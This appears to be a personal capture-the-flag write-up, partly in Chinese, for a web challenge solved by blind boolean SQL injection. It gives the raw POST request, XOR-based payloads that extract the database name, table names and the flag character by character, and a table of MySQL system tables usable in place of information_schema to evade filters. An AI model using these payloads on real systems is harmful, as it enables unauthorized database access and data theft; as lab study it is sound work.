---
tags:
  - CTF
date: "2026-01-25"
---

- 🖥️ Terminal / Shell
- 🚩 Flag
- 🛠️ Exploit script
- 📂 Files / SMBr
- 📡 Network
- 🌐 Web
- 🔑 Credentials
- ⚔️ Attack
- 📈 PrivEsc / Post-Exploitation
- 📚 Notes / References
- 🐚 Reverse Shell
- 🎯 Target
- 🚪 Entry Point
- 🧰 Tools
- 🖥️ Machine

# 🔎 Recon

### 🚩 Flag

| Flag                                       | Notes |
| ------------------------------------------ | ----- |
| flag{a6e675b2-c9ec-4bbc-b3c1-7bf8ae838c85} | sql   |

## Info
## exploit
```http
POST /index.php HTTP/1.1
Host: a3054ae0-2da2-4016-bcb3-7bc96332a92c.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Origin: http://a3054ae0-2da2-4016-bcb3-7bc96332a92c.node5.buuoj.cn:81
Connection: keep-alive
Referer: http://a3054ae0-2da2-4016-bcb3-7bc96332a92c.node5.buuoj.cn:81/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

id=1^(1=1)
```

通过
id=1^(1=1) => false
id=1^(1=0) => true
判断为数字型注入

```
# 判断数据库长度 => 12
id=1^(length(database())=11)    
# 数据库名称 => ctftraining
id=1^(ascii(substr(database(),1,1))=100)
# 表名
id=1^(ascii(substr((select(MIN(table_name))from(mysql.innodb_table_stats)where(database_name=database())),1,1))>100)
# 字段内容
id=1^(ascii(substr((select(min(flag))from(flag)),5,1))=100)
```

#### information_schema 替代品：
这些表之所以能被用来替代传统的 `information_schema`，核心原因在于 **MySQL 数据库的底层管理机制和性能监控需求**。即只要一个数据库需要运行，它就必须记录自己"有哪些数据"以及"这些数据运行得怎么样"。

| **库名.表名**                                 | **适用版本** | **提取内容**     | **备注**                                               |
| ----------------------------------------- | -------- | ------------ | ---------------------------------------------------- |
| **`mysql.innodb_table_stats`**            | 5.6+     | 库名、表名        | **最常用**，数据持久化。                                       |
| **`mysql.innodb_index_stats`**            | 5.6+     | 库名、表名、索引名    | 当上表失效时，这是最佳备份。                                       |
| **`sys.x$schema_flattened_keys`**         | 5.7+     | 库名、表名、索引名    | 属于 `sys` 库的原始表，速度快。                                  |
| **`sys.x$ps_schema_table_statistics_io`** | 5.7+     | 库名、表名        | 记录了 I/O 统计，通常会有活跃表名。                                 |
| **`sys.x$statement_analysis`**            | 5.7+     | 最近执行的 SQL 语句 | **奇招**。可以查到别人（或后台）执行的 `INSERT` 或 `SELECT` 语句，直接看到表名。 |
| **`sys.schema_table_statistics`**         | 5.7+     | 库名、表名        | `sys` 库视图，注意不带 `_with_buffer` 后缀的也可以尝试。              |
